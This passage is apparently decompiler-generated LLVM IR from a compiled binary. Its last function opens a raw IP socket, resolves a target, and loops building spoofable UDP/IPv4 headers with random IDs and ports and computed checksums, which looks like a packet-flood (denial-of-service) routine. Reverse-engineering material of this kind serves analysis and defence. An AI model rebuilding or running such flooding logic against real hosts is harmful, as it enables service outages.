  %stack_var_-4 = alloca i32, align 4
  store i32 39164, i32* %stack_var_-4, align 4
  %v2_98f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_98f8, i32* @fp, align 4
  %v7_9914 = icmp eq i32 %arg3, 1
  br i1 %v7_9914, label %dec_label_pc_9968, label %dec_label_pc_991c

dec_label_pc_991c:                                ; preds = %dec_label_pc_98f0
  store i32 %arg2, i32* @r2, align 4
  %v3_9928 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_14f38.96 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9960 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_14eac.86 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_9968:                                ; preds = %dec_label_pc_98f0
  %v2_996c = load i8, i8* bitcast (i8** @global_var_1f4ec.23 to i8*), align 4
  %v2_9970 = icmp eq i8 %v2_996c, 0
  br i1 %v2_9970, label %dec_label_pc_9978, label %dec_label_pc_998c

dec_label_pc_9978:                                ; preds = %dec_label_pc_9968
  store i32 %arg2, i32* @r2, align 4
  %v3_9984 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_14f54.102 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_998c:                                ; preds = %dec_label_pc_9968
  %v1_9990 = add i32 %arg4, 4
  %v1_9994 = inttoptr i32 %v1_9990 to i32*
  %v2_9994 = load i32, i32* %v1_9994, align 4
  %v3_99a0 = call i32 @function_f0f4(i8* bitcast (i32* @global_var_21b68.92 to i8*), i32 %v2_9994)
  %v2_99a8 = icmp eq i32 %v3_99a0, 0
  br i1 %v2_99a8, label %dec_label_pc_99c4, label %dec_label_pc_99b0

dec_label_pc_99b0:                                ; preds = %dec_label_pc_998c
  store i32 %arg2, i32* @r2, align 4
  %v3_99bc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_14f74.105 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_99c4:                                ; preds = %dec_label_pc_998c
  store i8 0, i8* bitcast (i8** @global_var_1f4ec.23 to i8*), align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_99dc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_14f90.107 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %dec_label_pc_99b0, %dec_label_pc_9978, %dec_label_pc_991c, %dec_label_pc_99c4
  %v9_99e4 = phi i32 [ %v3_99bc, %dec_label_pc_99b0 ], [ %v3_9984, %dec_label_pc_9978 ], [ %v3_9960, %dec_label_pc_991c ], [ %v3_99dc, %dec_label_pc_99c4 ]
  ret i32 %v9_99e4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_21b68.92, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1f4ec.23 to i8*), { 0, 4, 1, 3, 2 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_99e0, { 3, 0, 1, 2 }
}

define i32 @function_9a0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a0c:
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9a10 = load i32, i32* @r4, align 4
  store i32 %v3_9a10, i32* %stack_var_-20, align 4
  store i32 39448, i32* %stack_var_-4, align 4
  %v16_9a10 = ptrtoint i32* %stack_var_-20 to i32
  %v2_9a14 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a14, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-304, align 4
  %v7_9a30 = icmp eq i32 %arg3, 1
  br i1 %v7_9a30, label %dec_label_pc_9a64, label %dec_label_pc_9a38

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9a0c
  store i32 %arg2, i32* @r2, align 4
  %v3_9a44 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_14fb0.109 to i32))
  store i32 0, i32* bitcast (i8** @global_var_1f4f0.33 to i32*), align 4
  store i32 0, i32* @global_var_1f4f4.35, align 4
  br label %dec_label_pc_9c40

dec_label_pc_9a64:                                ; preds = %dec_label_pc_9a0c
  %v1_9a68 = add i32 %arg4, 4
  %v1_9a6c = inttoptr i32 %v1_9a68 to i32*
  %v2_9a6c = load i32, i32* %v1_9a6c, align 4
  store i32 %v2_9a6c, i32* @r0, align 4
  %v0_9a74 = call i32 @function_ecc0()
  %tmp = icmp ult i32 %v0_9a74, 17
  br i1 %tmp, label %dec_label_pc_9a98, label %dec_label_pc_9a84

dec_label_pc_9a84:                                ; preds = %dec_label_pc_9a64
  store i32 %arg2, i32* @r2, align 4
  %v3_9a90 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_14fd0.113 to i32))
  br label %dec_label_pc_9c40

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a64
  %v3_9a98 = load i32, i32* %stack_var_-304, align 4
  %v1_9a9c = add i32 %v3_9a98, 4
  %v1_9aa0 = inttoptr i32 %v1_9a9c to i32*
  %v2_9aa0 = load i32, i32* %v1_9aa0, align 4
  %v2_9aa4 = ptrtoint i32* %stack_var_-288 to i32
  %v2_9ab0 = inttoptr i32 %v2_9aa0 to i8*
  %v3_9ab0 = call i32 @function_ed20(i32 %v2_9aa4, i8* %v2_9ab0)
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9abc = call i32 @function_ecc0()
  %v1_9ac4 = add i32 %v16_9a10, -1
  %v2_9ad4 = add i32 %v1_9ac4, %v0_9abc
  %v2_9ad8 = add i32 %v2_9ad4, -268
  %v1_9adc = inttoptr i32 %v2_9ad8 to i8*
  %v2_9adc = load i8, i8* %v1_9adc, align 1
  %v7_9ae0 = icmp eq i8 %v2_9adc, 46
  br i1 %v7_9ae0, label %dec_label_pc_9ae8, label %dec_label_pc_9b68

dec_label_pc_9ae8:                                ; preds = %dec_label_pc_9a98
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9af0 = call i32 @function_ecc0()
  %v1_9af8 = add i32 %v16_9a10, -269
  %v2_9b0c = add i32 %v1_9af8, %v0_9af0
  %v3_9b14 = inttoptr i32 %v2_9b0c to i8*
  store i8 0, i8* %v3_9b14, align 1
  br label %dec_label_pc_9b68

dec_label_pc_9b2c:                                ; preds = %dec_label_pc_9b68
  %v2_9b3c = add i32 %stack_var_-32.0, %v16_9a10
  %v2_9b40 = add i32 %v2_9b3c, -268
  %v1_9b44 = inttoptr i32 %v2_9b40 to i8*
  %v2_9b44 = load i8, i8* %v1_9b44, align 1
  %v7_9b48 = icmp eq i8 %v2_9b44, 46
  br i1 %v7_9b48, label %dec_label_pc_9b50, label %dec_label_pc_9b5c

dec_label_pc_9b50:                                ; preds = %dec_label_pc_9b2c
  %v1_9b54 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_9b5c

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_9b2c, %dec_label_pc_9b50
  %stack_var_-28.0 = phi i32 [ %v1_9b54, %dec_label_pc_9b50 ], [ %stack_var_-28.1, %dec_label_pc_9b2c ]
  %v1_9b60 = add i32 %stack_var_-32.0, 1
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9ae8, %dec_label_pc_9a98, %dec_label_pc_9b5c
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_9b5c ], [ 1, %dec_label_pc_9a98 ], [ 1, %dec_label_pc_9ae8 ]
  %stack_var_-32.0 = phi i32 [ %v1_9b60, %dec_label_pc_9b5c ], [ 0, %dec_label_pc_9a98 ], [ 0, %dec_label_pc_9ae8 ]
  store i32 %stack_var_-32.0, i32* @r4, align 4
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9b74 = call i32 @function_ecc0()
  %v0_9b7c = load i32, i32* @r4, align 4
  %v3_9b7c = icmp ult i32 %v0_9b7c, %v0_9b74
  br i1 %v3_9b7c, label %dec_label_pc_9b2c, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9b68
  %v1_9b88 = sub i32 4, %stack_var_-28.1
  %v3_9be022 = icmp eq i32 %v1_9b88, 0
  %v5_9be427 = icmp sgt i32 %v1_9b88, 0
  br i1 %v5_9be427, label %dec_label_pc_9b9c, label %dec_label_pc_9be8

dec_label_pc_9b9c:                                ; preds = %dec_label_pc_9b84, %dec_label_pc_9b9c
  %storemerge228 = phi i32 [ %v1_9bd0, %dec_label_pc_9b9c ], [ 0, %dec_label_pc_9b84 ]
  store i32 %v2_9aa4, i32* @r4, align 4
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9ba8 = call i32 @function_ecc0()
  %v0_9bb0 = load i32, i32* @r4, align 4
  %v2_9bb0 = add i32 %v0_9bb0, %v0_9ba8
  store i32 %v2_9bb0, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1501c.115 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  %v0_9bc8 = call i32 @function_ec10()
  %v1_9bd0 = add nuw nsw i32 %storemerge228, 1
  %v5_9be4 = icmp slt i32 %v1_9bd0, %v1_9b88
  br i1 %v5_9be4, label %dec_label_pc_9b9c, label %dec_label_pc_9be8

dec_label_pc_9be8:                                ; preds = %dec_label_pc_9b9c, %dec_label_pc_9b84
  %v1_9bf0 = bitcast i32* %stack_var_-288 to i8*
  %v2_9bf0 = call i32 @function_f2a8(i8* %v1_9bf0)
  br i1 %v3_9be022, label %dec_label_pc_9c34, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9be8
  %v2_9c20 = call i32 @function_8c48(i32 256, i32 %v1_9b88)
  br label %dec_label_pc_9c34

dec_label_pc_9c34:                                ; preds = %dec_label_pc_9be8, %dec_label_pc_9c18
  %storemerge = phi i32 [ %v2_9c20, %dec_label_pc_9c18 ], [ 1, %dec_label_pc_9be8 ]
  %v12_9c447 = phi i32 [ %v2_9c20, %dec_label_pc_9c18 ], [ %v2_9bf0, %dec_label_pc_9be8 ]
  store i32 %storemerge, i32* @global_var_1f4f4.35, align 4
  store i32 %v2_9bf0, i32* bitcast (i8** @global_var_1f4f0.33 to i32*), align 4
  br label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %dec_label_pc_9a84, %dec_label_pc_9a38, %dec_label_pc_9c34
  %v12_9c44 = phi i32 [ %v3_9a90, %dec_label_pc_9a84 ], [ %v3_9a44, %dec_label_pc_9a38 ], [ %v12_9c447, %dec_label_pc_9c34 ]
  ret i32 %v12_9c44

; uselistorder directives
  uselistorder i32 %v2_9bf0, { 1, 0 }
  uselistorder i32 %v1_9bd0, { 1, 0 }
  uselistorder i32 %v1_9b88, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-32.0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v16_9a10, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9c40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c34, { 1, 0 }
  uselistorder label %dec_label_pc_9b9c, { 1, 0 }
  uselistorder label %dec_label_pc_9b68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9b5c, { 1, 0 }
}

define i32 @function_9c5c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9c5c:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9c60 = load i32, i32* @fp, align 4
  store i32 40040, i32* %stack_var_-4, align 4
  %v2_9c64 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c64, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_9c78 = call i32 @function_f3c0(i32 %arg2)
  store i32 %v1_9c78, i32* @global_var_1f8fc.117, align 4
  %v3_9c90 = icmp eq i32 %v1_9c78, -1
  br i1 %v3_9c90, label %dec_label_pc_9c98, label %dec_label_pc_9cfc

dec_label_pc_9c98:                                ; preds = %dec_label_pc_9c5c
  %v3_9c98 = load i32, i32* %stack_var_-28, align 4
  %v1_9c9c = call i32 @function_f3e4(i32 %v3_9c98)
  %v2_9cac = icmp eq i32 %v1_9c9c, 0
  br i1 %v2_9cac, label %dec_label_pc_9cb4, label %dec_label_pc_9cd8

dec_label_pc_9cb4:                                ; preds = %dec_label_pc_9c98
  %v2_9cb8 = load i32, i32* @global_var_21c70.25, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_9ccc = call i32 @function_8374(i32 %v2_9cb8, i32 ptrtoint ([33 x i8]* @global_var_15020.120 to i32))
  %v1_9cd4 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_9cd8

dec_label_pc_9cd8:                                ; preds = %dec_label_pc_9c98, %dec_label_pc_9cb4
  %v1_9cdc = add i32 %v1_9c9c, 16
  %v2_9cdc = inttoptr i32 %v1_9cdc to i32*
  %v3_9cdc = load i32, i32* %v2_9cdc, align 4
  %v1_9ce0 = inttoptr i32 %v3_9cdc to i32*
  %v2_9ce0 = load i32, i32* %v1_9ce0, align 4
  %v1_9cec = add i32 %v1_9c9c, 12
  %v2_9cec = inttoptr i32 %v1_9cec to i32*
  %v3_9cec = load i32, i32* %v2_9cec, align 4
  store i32 %v3_9cec, i32* @r2, align 4
  %v3_9cf8 = call i32 @function_ec00(i32 %v2_9ce0, i32 ptrtoint (i32* @global_var_1f8fc.117 to i32), i32 %v3_9cec)
  %v2_9d00.pre = load i32, i32* @global_var_1f8fc.117, align 4
  br label %dec_label_pc_9cfc

dec_label_pc_9cfc:                                ; preds = %dec_label_pc_9c5c, %dec_label_pc_9cd8
  %v2_9d00 = phi i32 [ %v1_9c78, %dec_label_pc_9c5c ], [ %v2_9d00.pre, %dec_label_pc_9cd8 ]
  store i32 %v3_9c60, i32* @fp, align 4
  ret i32 %v2_9d00

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_1f8fc.117, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9cfc, { 1, 0 }
  uselistorder label %dec_label_pc_9cd8, { 1, 0 }
}

define i32 @function_9d1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9d1c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1544 = alloca i32, align 4
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1572 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40232, i32* %stack_var_-4, align 4
  %v2_9d24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d24, i32* @fp, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9d4c = call i32 @function_cb74(i32* null)
  store i32 %v2_9d4c, i32* %r3.global-to-local, align 4
  %v1_9d5c = call i32 @function_83d8(i32 %arg2)
  store i32 %v1_9d5c, i32* %r3.global-to-local, align 4
  %v2_9d64 = icmp eq i32 %v1_9d5c, 0
  br i1 %v2_9d64, label %dec_label_pc_9d6c, label %dec_label_pc_a100

dec_label_pc_9d6c:                                ; preds = %dec_label_pc_9d1c
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 255, i32* %r2.global-to-local, align 4
  %v3_9d78 = call i32 @function_f8dc(i32 2, i32 3, i32 255)
  store i32 %v3_9d78, i32* %r3.global-to-local, align 4
  %v1_9d88 = icmp slt i32 %v3_9d78, 0
  br i1 %v1_9d88, label %dec_label_pc_9d90, label %dec_label_pc_9d98

dec_label_pc_9d90:                                ; preds = %dec_label_pc_9d6c
  %v1_9d94 = call i32 @function_10500(i32 1)
  br label %dec_label_pc_9d98

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9d6c, %dec_label_pc_9d90
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v8_9da0 = icmp sgt i32 %arg3, 2
  br i1 %v8_9da0, label %dec_label_pc_9dbc, label %dec_label_pc_9da4

dec_label_pc_9da4:                                ; preds = %dec_label_pc_9d98
  store i32 ptrtoint ([39 x i8]* @global_var_15044.122 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9db0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_15044.122 to i32))
  %v1_9db8 = call i32 @function_10500(i32 1)
  br label %dec_label_pc_9dbc

dec_label_pc_9dbc:                                ; preds = %dec_label_pc_9d98, %dec_label_pc_9da4
  %v1_9dc0 = add i32 %arg4, 4
  store i32 %v1_9dc0, i32* %r3.global-to-local, align 4
  %v1_9dc4 = inttoptr i32 %v1_9dc0 to i32*
  %v2_9dc4 = load i32, i32* %v1_9dc4, align 4
  store i32 %v2_9dc4, i32* %r3.global-to-local, align 4
  store i32 %v2_9dc4, i32* %r1.global-to-local, align 4
  %v2_9dd0 = call i32 @function_9c5c(i32 %arg2, i32 %v2_9dc4)
  %v1_9de0 = add i32 %arg4, 8
  store i32 %v1_9de0, i32* %r3.global-to-local, align 4
  %v1_9de4 = inttoptr i32 %v1_9de0 to i32*
  %v2_9de4 = load i32, i32* %v1_9de4, align 4
  store i32 %v2_9de4, i32* %r3.global-to-local, align 4
  %v1_9dec = inttoptr i32 %v2_9de4 to i8*
  %v2_9dec = call i32 @function_10354(i8* %v1_9dec)
  %v1_9dfc = add i32 %arg4, 12
  store i32 %v1_9dfc, i32* %r3.global-to-local, align 4
  %v1_9e00 = inttoptr i32 %v1_9dfc to i32*
  %v2_9e00 = load i32, i32* %v1_9e00, align 4
  store i32 %v2_9e00, i32* %r3.global-to-local, align 4
  %v1_9e08 = inttoptr i32 %v2_9e00 to i8*
  %v2_9e08 = call i32 @function_10354(i8* %v1_9e08)
  %v2_9e1c = ptrtoint i32* %stack_var_-1572 to i32
  %tmp42 = bitcast i32* %stack_var_-1572 to i8*
  %tmp43 = bitcast i32* %stack_var_-1552 to i8*
  %v2_9e44 = ptrtoint i32* %stack_var_-1544 to i32
  store i32 %v2_9e44, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 1472, i32* @r2, align 4
  %v2_9e58 = bitcast i32* %stack_var_-1544 to i8*
  %v3_9e58 = call i32 @function_ec20(i8* %v2_9e58, i32 10)
  store i32 %v1_9dc0, i32* %r3.global-to-local, align 4
  %v2_9e64 = load i32, i32* %v1_9dc4, align 4
  store i32 %v2_9e64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_1506c.124 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9e74 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1506c.124 to i32))
  store i8 69, i8* %tmp42, align 4
  %v3_9ec8 = or i32 %v2_9e1c, 1
  %v4_9ec8 = inttoptr i32 %v3_9ec8 to i8*
  store i8 0, i8* %v4_9ec8, align 1
  store i32 %v2_9e1c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v3_9ed8 = or i32 %v2_9e1c, 2
  %v4_9ed8 = inttoptr i32 %v3_9ed8 to i8*
  store i8 -36, i8* %v4_9ed8, align 2
  %v0_9edc = load i32, i32* %r2.global-to-local, align 4
  %v1_9edc = trunc i32 %v0_9edc to i8
  %v2_9edc = load i32, i32* %r1.global-to-local, align 4
  %v3_9edc = add i32 %v2_9edc, 3
  %v4_9edc = inttoptr i32 %v3_9edc to i8*
  store i8 %v1_9edc, i8* %v4_9edc, align 1
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9ee8 = add i32 %v2_9e1c, 6
  %v4_9ee8 = inttoptr i32 %v3_9ee8 to i8*
  store i8 0, i8* %v4_9ee8, align 2
  %v0_9eec = load i32, i32* %r3.global-to-local, align 4
  %v1_9eec = trunc i32 %v0_9eec to i8
  %v2_9eec = load i32, i32* %r2.global-to-local, align 4
  %v3_9eec = add i32 %v2_9eec, 7
  %v4_9eec = inttoptr i32 %v3_9eec to i8*
  store i8 %v1_9eec, i8* %v4_9eec, align 1
  %v3_9ef8 = add i32 %v2_9e1c, 9
  %v4_9ef8 = inttoptr i32 %v3_9ef8 to i8*
  store i8 17, i8* %v4_9ef8, align 1
  %v3_9f04 = add i32 %v2_9e1c, 8
  %v4_9f04 = inttoptr i32 %v3_9f04 to i8*
  store i8 64, i8* %v4_9f04, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v2_9f10 = add i32 %v2_9e1c, 16
  %v3_9f10 = inttoptr i32 %v2_9f10 to i32*
  store i32 %v2_9dd0, i32* %v3_9f10, align 4
  %v3_9f1c = urem i32 %tmp13, 65536
  store i32 %v3_9f1c, i32* %r3.global-to-local, align 4
  %v1_9f24 = call i32 @function_f294(i32 %v3_9f1c)
  %sext = mul i32 %v1_9f24, 16777216
  %v1_9f28 = sdiv i32 %sext, 16777216
  store i32 %v1_9f28, i32* %r3.global-to-local, align 4
  %v4_9f2c = ptrtoint i32* %stack_var_-1552 to i32
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f30 = trunc i32 %v1_9f28 to i8
  %v3_9f30 = add i32 %v4_9f2c, 4
  %v4_9f30 = inttoptr i32 %v3_9f30 to i8*
  store i8 %v1_9f30, i8* %v4_9f30, align 4
  %v0_9f34 = load i32, i32* %r3.global-to-local, align 4
  %v3_9f347 = udiv i32 %v0_9f34, 256
  %v1_9f38 = trunc i32 %v3_9f347 to i8
  %v2_9f38 = load i32, i32* %r2.global-to-local, align 4
  %v3_9f38 = add i32 %v2_9f38, 5
  %v4_9f38 = inttoptr i32 %v3_9f38 to i8*
  store i8 %v1_9f38, i8* %v4_9f38, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v2_9f78 = icmp eq i32 %v2_9dec, 0
  %v3_9fc0 = or i32 %v4_9f2c, 2
  %v4_9fc0 = inttoptr i32 %v3_9fc0 to i8*
  %v3_9ff0 = add i32 %v4_9f2c, 6
  %v4_9ff0 = inttoptr i32 %v3_9ff0 to i8*
  %v2_a008 = add i32 %v2_9e1c, 12
  %v3_a008 = inttoptr i32 %v2_a008 to i32*
  %v3_a020 = add i32 %v2_9e1c, 4
  %v4_a020 = inttoptr i32 %v3_a020 to i8*
  %v3_a050 = add i32 %v2_9e1c, 10
  %v4_a050 = inttoptr i32 %v3_a050 to i8*
  %v2_a07c = ptrtoint i32* %stack_var_-72 to i32
  %v2_a0d4 = add i32 %v2_9e08, %v2_9d4c
  %v3_9f88 = urem i32 %v2_9dec, 65536
  %v3_9f70 = or i32 %v4_9f2c, 1
  %v4_9f70 = inttoptr i32 %v3_9f70 to i8*
  br label %dec_label_pc_9f54

dec_label_pc_9f54:                                ; preds = %dec_label_pc_a0f0, %dec_label_pc_9dbc
  %storemerge = phi i32 [ %v2_9dd0, %dec_label_pc_9dbc ], [ %v1_a0f4, %dec_label_pc_a0f0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_9dbc ], [ %v1_a0f4, %dec_label_pc_a0f0 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_9f54 = call i32 @function_fe50()
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f68 = trunc i32 %v0_9f54 to i8
  store i8 %v1_9f68, i8* %tmp43, align 4
  %v3_9f60 = udiv i32 %v0_9f54, 256
  %v1_9f70 = trunc i32 %v3_9f60 to i8
  store i8 %v1_9f70, i8* %v4_9f70, align 1
  store i32 %v2_9dec, i32* %r3.global-to-local, align 4
  br i1 %v2_9f78, label %dec_label_pc_9fac, label %dec_label_pc_9f80

dec_label_pc_9f80:                                ; preds = %dec_label_pc_9f54
  store i32 %v3_9f88, i32* %r3.global-to-local, align 4
  %v1_9f90 = call i32 @function_f294(i32 %v3_9f88)
  %sext3 = mul i32 %v1_9f90, 16777216
  %v1_9f94 = sdiv i32 %sext3, 16777216
  store i32 %v1_9f94, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f9c = trunc i32 %v1_9f94 to i8
  store i8 %v1_9f9c, i8* %v4_9fc0, align 2
  %v0_9fa0 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fa0 = sdiv i32 %v0_9fa0, 256
  store i32 %v3_9fa0, i32* %r3.global-to-local, align 4
  %v1_9fa4 = trunc i32 %v3_9fa0 to i8
  %v2_9fa4 = load i32, i32* %r2.global-to-local, align 4
  %v3_9fa4 = add i32 %v2_9fa4, 3
  %v4_9fa4 = inttoptr i32 %v3_9fa4 to i8*
  store i8 %v1_9fa4, i8* %v4_9fa4, align 1
  br label %dec_label_pc_9fcc

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f54
  %v0_9fac = call i32 @function_fe50()
  %v3_9fb8 = urem i32 %v0_9fac, 65536
  store i32 %v3_9fb8, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9fc0 = trunc i32 %v0_9fac to i8
  store i8 %v1_9fc0, i8* %v4_9fc0, align 2
  %v0_9fc4 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fc4 = sdiv i32 %v0_9fc4, 256
  store i32 %v3_9fc4, i32* %r3.global-to-local, align 4
  %v1_9fc8 = trunc i32 %v3_9fc4 to i8
  %v2_9fc8 = load i32, i32* %r2.global-to-local, align 4
  %v3_9fc8 = add i32 %v2_9fc8, 3
  %v4_9fc8 = inttoptr i32 %v3_9fc8 to i8*
  store i8 %v1_9fc8, i8* %v4_9fc8, align 1
  br label %dec_label_pc_9fcc

dec_label_pc_9fcc:                                ; preds = %dec_label_pc_9f80, %dec_label_pc_9fac
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 1500, i32* %r1.global-to-local, align 4
  %v3_9fe4 = call i32 @function_8cc4(i8* %tmp42, i32 1500)
  %sext4 = mul i32 %v3_9fe4, 16777216
  %v1_9fe8 = sdiv i32 %sext4, 16777216
  store i32 %v1_9fe8, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9ff0 = trunc i32 %v1_9fe8 to i8
  store i8 %v1_9ff0, i8* %v4_9ff0, align 2
  %v0_9ff4 = load i32, i32* %r3.global-to-local, align 4
  %v3_9ff4 = sdiv i32 %v0_9ff4, 256
  store i32 %v3_9ff4, i32* %r3.global-to-local, align 4
  %v1_9ff8 = trunc i32 %v3_9ff4 to i8
  %v2_9ff8 = load i32, i32* %r2.global-to-local, align 4
  %v3_9ff8 = add i32 %v2_9ff8, 7
  %v4_9ff8 = inttoptr i32 %v3_9ff8 to i8*
  store i8 %v1_9ff8, i8* %v4_9ff8, align 1
  %v0_9ffc = call i32 @function_8548()
  store i32 %v0_9ffc, i32* %r2.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 %v0_9ffc, i32* %v3_a008, align 4
  %v0_a00c = call i32 @function_fe50()
  %v3_a018 = urem i32 %v0_a00c, 65536
  store i32 %v3_a018, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v1_a020 = trunc i32 %v0_a00c to i8
  store i8 %v1_a020, i8* %v4_a020, align 4
  %v0_a024 = load i32, i32* %r3.global-to-local, align 4
  %v3_a0248 = udiv i32 %v0_a024, 256
  %v1_a028 = trunc i32 %v3_a0248 to i8
  %v2_a028 = load i32, i32* %r2.global-to-local, align 4
  %v3_a028 = add i32 %v2_a028, 5
  %v4_a028 = inttoptr i32 %v3_a028 to i8*
  store i8 %v1_a028, i8* %v4_a028, align 1
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 1500, i32* %r1.global-to-local, align 4
  %v3_a044 = call i32 @function_8cc4(i8* %tmp42, i32 1500)
  %sext5 = mul i32 %v3_a044, 16777216
  %v1_a048 = sdiv i32 %sext5, 16777216
  store i32 %v1_a048, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v1_a050 = trunc i32 %v1_a048 to i8
  store i8 %v1_a050, i8* %v4_a050, align 2
  %v0_a054 = load i32, i32* %r3.global-to-local, align 4
  %v3_a0549 = udiv i32 %v0_a054, 256
  %v1_a058 = trunc i32 %v3_a0549 to i8
  %v2_a058 = load i32, i32* %r2.global-to-local, align 4
  %v3_a058 = add i32 %v2_a058, 11
  %v4_a058 = inttoptr i32 %v3_a058 to i8*
  store i8 %v1_a058, i8* %v4_a058, align 1
  store i32 %v3_9fc0, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r1.global-to-local, align 4
  store i32 1500, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
